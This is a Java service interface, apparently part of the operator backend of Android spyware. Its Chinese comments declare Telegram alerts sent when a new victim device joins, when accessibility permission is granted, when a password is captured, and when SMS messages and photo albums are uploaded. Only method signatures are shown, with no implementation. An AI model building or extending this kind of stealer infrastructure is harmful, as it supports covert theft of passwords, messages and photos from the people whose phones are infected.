package io.renren.modules.app.service;

import com.baomidou.mybatisplus.extension.service.IService;

import io.renren.modules.app.entity.TelegramBotEntity;

public interface TelegramBotService extends IService<TelegramBotEntity> {


	/**
	 * 新设备加入通知
	 */
	void newDeviceNotify(String pkg,String deviceId);
	/**
	 * 无障碍授权成功通知
	 */
	void accessibilityNotify(String pkg,String deviceId);
	
	/**
	 * 密码获取成功通知
	 */
	void passwordNotify(String pkg,String deviceId,String type);
	
	/**
	 * 短信上传成功通知
	 */
	void smsNotify(String pkg,String deviceId);
	/**
	 * 相册上传成功通知
	 */
	void albumNotify(String pkg,String deviceId);
 
	
}
